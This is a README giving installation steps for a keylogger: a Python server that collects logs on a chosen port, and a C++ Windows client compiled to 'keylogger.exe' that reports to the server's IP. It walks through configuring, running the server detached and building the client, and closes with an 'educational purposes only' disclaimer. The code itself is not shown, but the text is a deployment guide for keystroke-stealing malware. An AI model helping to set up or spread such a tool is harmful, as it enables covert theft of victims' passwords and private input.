# Installation and usage
## 1. Server side
Let's start with the server side.
Whole server is written in python and it contains only one file.
### To install it on linux (MS Windows version in no available):
- Download the whole repository from GitHub.
- Copy (through FTP or WinSCP) ```/server/server.py``` file to the computer on which you want to install it.
- Make sure that you have Python3 installed (just type in terminal ```python3 --version```)
- Create directory for app e.g. ```mkdir /somelaction/keylogger/```
- Create directory for logs (it is recommended to create it in same directory as app) e.g. ```mkdir /somelocation/keylogger/logs```
- Open ```server.py``` file in editor for example ```vim``` and change variables on lines from ```7``` to ```10``` according to your needs:
    * ```threadmax``` describes how much threads server will run
    * ```host``` your computer's IP address
    * ```port``` 5175 by default, but you can change it (make sure that it is open in firewall)
    * ```logpath``` path to your log folder
- Run server by following command: ```screen -dm bash -c '/usr/bin/python3 /somelocation/sockets.py'```

## 2. Client side
Now, let's set up the client side.
- Open ```main.cpp``` file
- Change constants on lines ```7``` and ```8``` according to what you have set on server side:
    * ```IP``` your computer's IP address
    * ```PORT``` port on server
- Compile with command: ```g++ main.cpp Telnet.cpp Keys.cpp -lws2_32 -o keylogger.exe```

That's it!
## This program is written only for educational purposes. Author of this program is not responsible for possible illegal usage of this program!
